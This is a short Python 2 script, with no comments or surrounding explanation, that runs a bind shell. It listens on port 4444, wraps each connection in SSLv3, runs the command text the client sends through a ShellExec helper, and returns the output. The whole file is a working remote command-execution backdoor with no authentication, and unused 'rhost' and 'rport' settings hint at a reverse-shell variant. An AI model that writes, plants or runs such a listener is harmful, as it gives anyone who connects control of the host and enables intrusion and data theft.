from shellmisc import ShellExec
import socket, ssl, os
lport = 4444
rhost = ""
rport = 4444
column1 = 0
column2 = 0
try:
   bindsocket = socket.socket()
   bindsocket.bind(('', lport))
   bindsocket.listen(5)
except:
   bindsocket.close()
   bindsocket = socket.socket()
   bindsocket.bind(('', lport))
   bindsocket.listen(5)

while 1:
   newsocket, fromaddr = bindsocket.accept()
   c = ssl.wrap_socket(newsocket, server_side=True, certfile="server.pem",
                    keyfile="server.key", ssl_version=ssl.PROTOCOL_SSLv3)
   readdata = c.read()
   aShell = ShellExec(readdata)
   shl = aShell.GetStdout()
   print shl
   c.write(shl)
   c.close()


c.close()
bindsocket.close()
